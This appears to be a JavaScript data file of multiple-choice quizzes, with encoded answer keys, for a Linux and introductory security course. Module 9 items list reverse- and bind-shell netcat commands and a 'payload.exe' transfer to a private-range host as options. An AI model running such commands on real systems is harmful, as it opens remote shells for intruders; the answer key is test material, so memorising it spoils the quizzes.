// Quiz data parsed from CSV files with XOR+Base64 encoded answers
import { encodeAnswer } from '../utils/quizCrypto';

function parseCsvQuiz(rows) {
    return rows.map(row => {
        const options = [row.a, row.b, row.c, row.d].filter(o => o && o !== 'Null');
        const correctIndex = options.indexOf(row.correct);
        const labels = ['A', 'B', 'C', 'D'];
        return {
            question: row.q,
            options,
            answer: encodeAnswer(labels[correctIndex] || 'A')
        };
    });
}

// Helper to build row objects
const r = (q, a, b, c, d, correct) => ({ q, a, b, c, d, correct });

// ─── Module 2 ───
const quiz21 = parseCsvQuiz([
    r("GUI Stands for?", "Graphical Universe Interface", "Graphical Unified Interface", "Graphical User Interface", null, "Graphical User Interface"),
    r("CLI Stands for?", "Command Line Interface", "Command Layout Interface", "Command Light Interface", null, "Command Line Interface"),
    r("What's the function of the 'echo' command?", "To print the contents of a file", "To delete a file", "To print whatever you put afterwards", null, "To print whatever you put afterwards"),
    r("What's the function of the 'whoami' command?", "To list the directory", "To print your username", "To delete your username", null, "To print your username")
]);

const quiz22 = parseCsvQuiz([
    r("What is stored in /etc?", "User home directories", "System configuration files", "Temporary files", null, "System configuration files"),
    r("What is stored in /home?", "System binaries", "Personal user files", "Log files", null, "Personal user files"),
    r("What is stored in /var?", "Variable data like logs", "User home directories", "Kernel source code", null, "Variable data like logs"),
    r("What does 'pwd' show?", "Current working directory", "Available disk space", "Processes list", null, "Current working directory"),
    r("What does 'ls' do?", "Changes directory", "Lists directory contents", "Creates new files", null, "Lists directory contents"),
    r("What does 'cd' do?", "Changes directory", "Copies files", "Deletes files", null, "Changes directory")
]);

const quiz23 = parseCsvQuiz([
    r("What does the 'touch' command do?", "Creates an empty file", "Displays file contents", "Deletes a file", null, "Creates an empty file"),
    r("What does 'mkdir' do?", "Moves files", "Creates a new directory", "Deletes a directory", null, "Creates a new directory"),
    r("What is the purpose of the 'cp' command?", "Copies files or directories", "Changes file permissions", "Compresses files", null, "Copies files or directories"),
    r("What does 'mv' do?", "Moves or renames files", "Displays running processes", "Deletes files", null, "Moves or renames files"),
    r("What does 'rm' do?", "Removes files or directories", "Renames files", "Reads a file", null, "Removes files or directories"),
    r("What does 'cat' do?", "Displays file contents", "Concatenates files", "Both displaying and concatenating files", null, "Both displaying and concatenating files"),
    r("What does the 'tree' command display?", "Directory structure in tree format", "A file's permissions", "Process hierarchy", null, "Directory structure in tree format"),
    r("What does 'man' provide?", "Manual pages for commands", "System logs", "File sizes", null, "Manual pages for commands")
]);

const quiz24 = parseCsvQuiz([
    r("What does tab completion do in the terminal?", "Automatically completes commands or filenames", "Opens a text editor", "Shows command history", null, "Automatically completes commands or filenames"),
    r("What is 'nano' used for?", "Editing text files", "Viewing logs", "Compiling code", null, "Editing text files"),
    r("What does piping (|) do?", "Redirects output of one command to another", "Runs commands in parallel", "Saves output to a file", null, "Redirects output of one command to another"),
    r("What is 'less' used for?", "Viewing text one screen at a time", "Editing files", "Listing directory contents", null, "Viewing text one screen at a time"),
    r("What is 'more' used for?", "Viewing text one screen at a time", "Finding files", "Copying files", null, "Viewing text one screen at a time"),
    r("What does 'grep' do?", "Searches for patterns in text", "Displays system status", "Compresses files", null, "Searches for patterns in text"),
    r("What does output redirection (>) do?", "Sends output to a file", "Displays output in reverse", "Sends output to another computer", null, "Sends output to a file"),
    r("What does command chaining with '&&' do?", "Runs the second command only if the first succeeds", "Runs the second command only if the first fails", "Runs commands at the same time", "Repeats the command until success", "Runs the second command only if the first succeeds"),
    r("What does command chaining with '||' do?", "Runs the second command only if the first fails", "Runs the second command only if the first succeeds", "Runs commands at the same time", "Repeats the command until success", "Runs the second command only if the first fails")
]);

// ─── Module 3 ───
const quiz31 = parseCsvQuiz([
    r("What are users in Linux?", "Accounts that can log in and run programs", "Files on the system", "Groups of commands", null, "Accounts that can log in and run programs"),
    r("What are groups in Linux?", "Collections of users", "Individual files", "Processes running on the system", null, "Collections of users"),
    r("Which command adds a new user with options?", "useradd", "usermod", "groups", "passwd", "useradd"),
    r("Which command modifies an existing user?", "usermod", "userdel", "id", "groups", "usermod"),
    r("Which command deletes a user?", "usermod", "userdel", "passwd", "useradd", "userdel"),
    r("Which command shows all groups a user belongs to?", "groups", "id", "passwd", "usermod", "groups"),
    r("Which command changes a user's password?", "passwd", "usermod", "useradd", "groups", "passwd"),
    r("Which command shows user ID and group ID information?", "id", "groups", "useradd", "userdel", "id")
]);

const quiz32 = parseCsvQuiz([
    r("What does 'chmod' do?", "Changes file permissions", "Changes file ownership", "Lists files", "Deletes files", "Changes file permissions"),
    r("What does 'chown' do?", "Changes file ownership", "Changes file permissions", "Shows file contents", "Moves files", "Changes file ownership"),
    r("What does 'ls -l' show?", "Detailed file information including permissions and owner", "Only file names", "Only directories", "Processes running", "Detailed file information including permissions and owner"),
    r("What are the three types of permissions in Linux?", "Read, Write, Execute", "Start, Stop, Pause", "Create, Delete, Modify", "Owner, Group, Others", "Read, Write, Execute"),
    r("Who can have permissions on a file?", "Owner, Group, Others", "Root only", "All users", "Only the file creator", "Owner, Group, Others"),
    r("How can you make a file read-only?", "chmod 444 filename", "chown user filename", "ls -l filename", "chmod 777 filename", "chmod 444 filename"),
    r("How can you give execute permission to a file?", "chmod +x filename", "chmod -x filename", "chown user filename", "ls -l filename", "chmod +x filename"),
    r("Practice: How do you secure a file for only the owner?", "chmod 600 filename", "chmod 777 filename", "chown root filename", "ls -l filename", "chmod 600 filename")
]);

const quiz33 = parseCsvQuiz([
    r("What is the root user in Linux?", "The superuser with full system access", "A normal user", "A group of users", "A service", "The superuser with full system access"),
    r("What does 'sudo' do?", "Allows a user to run commands as root or another user", "Deletes files", "Shows system info", "Changes user password", "Allows a user to run commands as root or another user"),
    r("Why use 'sudo' instead of logging in as root?", "For safety and controlled access", "Because root is slow", "To list files faster", "To create more users", "For safety and controlled access"),
    r("Which file controls which users can use sudo?", "/etc/sudoers", "/etc/passwd", "/etc/group", "/etc/shadow", "/etc/sudoers"),
    r("How do you run a command with sudo?", "sudo command", "root command", "su command", "chmod command", "sudo command")
]);

// ─── Module 4 ───
const quiz41 = parseCsvQuiz([
    r("What does 'apt update' do?", "Updates the package index", "Installs new packages", "Removes packages", null, "Updates the package index"),
    r("What does 'apt upgrade' do?", "Upgrades installed packages", "Installs new packages", "Removes packages", null, "Upgrades installed packages"),
    r("How do you install a package using APT?", "apt install package_name", "apt remove package_name", "apt update", "apt upgrade", "apt install package_name"),
    r("How do you remove a package using APT?", "apt remove package_name", "apt install package_name", "apt update", "apt upgrade", "apt remove package_name")
]);

const quiz42 = parseCsvQuiz([
    r("What is 'dpkg' used for?", "Install or manage .deb packages directly", "Upgrade all packages", "Update package index", "Remove packages", "Install or manage .deb packages directly"),
    r("How do you install a .deb package with dpkg?", "dpkg -i package.deb", "apt install package.deb", "apt update", "dpkg -r package.deb", "dpkg -i package.deb"),
    r("How do you remove a package using APT (Fully)?", "apt purge package_name", "apt remove package_name", "apt delete package_name", null, "apt purge package_name")
]);

// ─── Module 5 ───
const quiz51 = parseCsvQuiz([
    r("What protocol is used to identify a device on a network?", "ifconfig", "netstat", "ip", "nslookup", "ip"),
    r("What command shows network interfaces and their configuration?", "ifconfig", "ipconfig", "route", "ping", "ifconfig"),
    r("What is the special interface for communicating with yourself?", "LAN", "WAN", "Loopback", "Bridge", "Loopback"),
    r("Which command is used to test connectivity between hosts?", "ping", "ss", "lsof", "nmap", "ping")
]);

const quiz52 = parseCsvQuiz([
    r("What does DNS stand for?", "Domain Name System", "Data Network Service", "Distributed Name Server", "Dynamic Node System", "Domain Name System"),
    r("What is the main purpose of DNS?", "Translate domain names to IP addresses", "Secure network traffic", "Measure bandwidth", "Provide VPN services", "Translate domain names to IP addresses"),
    r("What does the command `dig example.com` do?", "Shows DNS records for example.com", "Shows open ports on example.com", "Shows running services", "Shows active connections", "Shows DNS records for example.com")
]);

const quiz53 = parseCsvQuiz([
    r("What is a protocol?", "A set of rules for communication", "A computer program", "A type of virus", "A hardware device", "A set of rules for communication"),
    r("What are ports used for?", "To connect protocols to the network", "To store files", "To charge devices", "To display graphics", "To connect protocols to the network"),
    r("What does 'nmap -sn' do?", "Host discovery (ping scan)", "Scan all ports", "Scan services", "Exploit systems", "Host discovery (ping scan)"),
    r("What does 'nmap -p-' do?", "Scan all ports", "Scan only port 80", "Scan top 100 ports", "Check OS", "Scan all ports"),
    r("What does 'nmap -sV' do?", "Detect service versions", "Find open users", "Show running processes", "Update system", "Detect service versions")
]);

// ─── Module 6 ───
const quiz61 = parseCsvQuiz([
    r("What is a shell script?", "A text file containing commands", "A compiled program", "A directory", "A binary file", "A text file containing commands"),
    r("Which symbol is used at the top of a shell script?", "#!/bin/bash", "//", "<?php", "<script>", "#!/bin/bash"),
    r("How do you make a shell script executable?", "chmod +x script.sh", "bash script.sh", "run script.sh", "sudo script.sh", "chmod +x script.sh"),
    r("How do you access the value of a variable named VAR?", "$VAR", "VAR", "@VAR", "%VAR", "$VAR"),
    r("What does an if statement do in shell scripting?", "Checks conditions and runs code based on result", "Repeats commands", "Defines variables", "Creates files", "Checks conditions and runs code based on result"),
    r("Which keyword is used to start a loop in bash?", "for", "repeat", "loop", "until", "for")
]);

const quiz62 = parseCsvQuiz([
    r("What is cron used for?", "Scheduling tasks", "Monitoring processes", "Listing files", "Managing users", "Scheduling tasks"),
    r("Which file stores user-specific cron jobs?", "crontab", "/etc/passwd", "/etc/sudoers", "/etc/shadow", "crontab"),
    r("Which command edits the current user's cron jobs?", "crontab -e", "cron -e", "editcron", "nano /etc/cron", "crontab -e"),
    r("Which command lists your current cron jobs?", "crontab -l", "cron -l", "lscron", "jobs", "crontab -l")
]);

// ─── Module 7 ───
const quiz71 = parseCsvQuiz([
    r("Which command lists running processes?", "ps", "ls", "jobs", "uptime", "ps"),
    r("Which command shows real-time process activity?", "top", "ps", "htop", "jobs", "top"),
    r("What does the 'kill' command do?", "Stops a process", "Starts a process", "Lists processes", "Suspends a process", "Stops a process"),
    r("What does pressing ^C do in the terminal?", "Terminates the running foreground process", "Suspends the process", "Runs it in the background", "Lists jobs", "Terminates the running foreground process"),
    r("What does pressing ^Z do in the terminal?", "Suspends the foreground process", "Terminates the process", "Resumes a process", "Lists jobs", "Suspends the foreground process"),
    r("Which command shows background and stopped jobs?", "jobs", "ps", "top", "uptime", "jobs"),
    r("Which command brings a background job to the foreground?", "fg", "bg", "jobs", "ps", "fg"),
    r("Which command resumes a job in the background?", "bg", "fg", "kill", "ps", "bg")
]);

const quiz72 = parseCsvQuiz([
    r("Which command provides an interactive process viewer with scrolling?", "htop", "ps", "watch", "uptime", "htop"),
    r("Which command is similar to htop but more modern and customizable?", "btop", "top", "jobs", "kill", "btop"),
    r("Which command repeatedly runs another command and updates the output?", "watch", "uptime", "ps", "htop", "watch"),
    r("Which command shows how long the system has been running?", "uptime", "jobs", "ps", "kill", "uptime")
]);

// ─── Module 8 ───
const quiz81 = parseCsvQuiz([
    r("What is systemd in Linux?", "Service and system manager", "Text editor", "Package manager", "File system", "Service and system manager"),
    r("Which command manages services (start/stop/enable)?", "systemctl", "journalctl", "ssh", "dmesg", "systemctl"),
    r("How do you start the SSH service?", "systemctl start ssh", "ssh start", "service sshd enable", "/etc/init.d/ssh start", "systemctl start ssh"),
    r("Which command shows the status of a service?", "systemctl status ssh", "journalctl -u ssh", "ps aux | grep ssh", "service status ssh", "systemctl status ssh")
]);

const quiz82 = parseCsvQuiz([
    r("Which command shows kernel logs?", "dmesg", "journalctl -u", "systemctl", "tail -f /var/log/syslog", "dmesg"),
    r("Which command shows the systemd journal logs?", "journalctl", "dmesg", "/var/log/syslog", "systemctl", "journalctl"),
    r("What does 'journalctl -f' do?", "Follows new log entries in real time", "Shows logs from last boot only", "Filters logs by unit", "Shows kernel logs", "Follows new log entries in real time"),
    r("How do you view logs for the ssh service with journalctl?", "journalctl -u ssh", "journalctl ssh", "journalctl --service ssh", "journalctl | grep ssh", "journalctl -u ssh")
]);

const quiz83 = parseCsvQuiz([
    r("What is a safe alternative to installing project packages system-wide?", "Use a Python virtual environment (venv)", "Use sudo pip install", "Delete system Python", "Install packages as root", "Use a Python virtual environment (venv)"),
    r("How do you create a virtual environment named myenv?", "python3 -m venv myenv", "virtualenv myenv", "venv create myenv", "pip install venv", "python3 -m venv myenv"),
    r("Which command activates a venv in bash?", "source myenv/bin/activate", "venv activate myenv", "activate myenv", "python -m activate myenv", "source myenv/bin/activate")
]);

// ─── Module 9 ───
const quiz91 = parseCsvQuiz([
    r("Which command securely copies files over SSH?", "scp", "wget", "curl", "nc", "scp"),
    r("Which tool downloads files from HTTP/HTTPS?", "scp", "wget", "nc", "ssh", "wget"),
    r("How do you start a simple HTTP server with Python 3 on port 8000?", "python3 -m http.server 8000", "python -m SimpleHTTPServer 8000", "nc -lvp 8000 -e /bin/sh", "scp -r . .", "python3 -m http.server 8000"),
    r("Which command copies payload.exe to /tmp on 10.10.10.5?", "scp payload.exe 10.10.10.5:/tmp/", "wget payload.exe 10.10.10.5:/tmp/", "nc -w 3 10.10.10.5 4444 > payload.exe", "curl -O http://10.10.10.5/payload.exe", "scp payload.exe 10.10.10.5:/tmp/"),
    r("Which netcat flag makes it listen for incoming connections?", "-l", "-e", "-p", "-u", "-l")
]);

const quiz92 = parseCsvQuiz([
    r("In a reverse shell, who initiates the connection?", "Target -> Attacker", "Attacker -> Target", "Both", "None", "Target -> Attacker"),
    r("A bind shell usually requires which condition?", "Target listens on a port", "Attacker listens on a port", "No network required", "Third-party server", "Target listens on a port"),
    r("A common downside of reverse shells is:", "Attacker must run a listener reachable by the target", "They cannot be interactive", "They always bypass firewalls", "They don't work with netcat", "Attacker must run a listener reachable by the target"),
    r("Which netcat command on the target connects back to attacker at 10.10.10.1:4444?", "nc 10.10.10.1 4444 -e /bin/bash", "nc -lvp 4444 -e /bin/bash", "scp 10.10.10.1:/bin/bash .", "wget http://10.10.10.1:4444/shell", "nc 10.10.10.1 4444 -e /bin/bash")
]);

const quizzes = {
    "Quiz2.1": quiz21,
    "Quiz2.2": quiz22,
    "Quiz2.3": quiz23,
    "Quiz2.4": quiz24,
    "Quiz3.1": quiz31,
    "Quiz3.2": quiz32,
    "Quiz3.3": quiz33,
    "Quiz4.1": quiz41,
    "Quiz4.2": quiz42,
    "Quiz5.1": quiz51,
    "Quiz5.2": quiz52,
    "Quiz5.3": quiz53,
    "Quiz6.1": quiz61,
    "Quiz6.2": quiz62,
    "Quiz7.1": quiz71,
    "Quiz7.2": quiz72,
    "Quiz8.1": quiz81,
    "Quiz8.2": quiz82,
    "Quiz8.3": quiz83,
    "Quiz9.1": quiz91,
    "Quiz9.2": quiz92
};

export default quizzes;
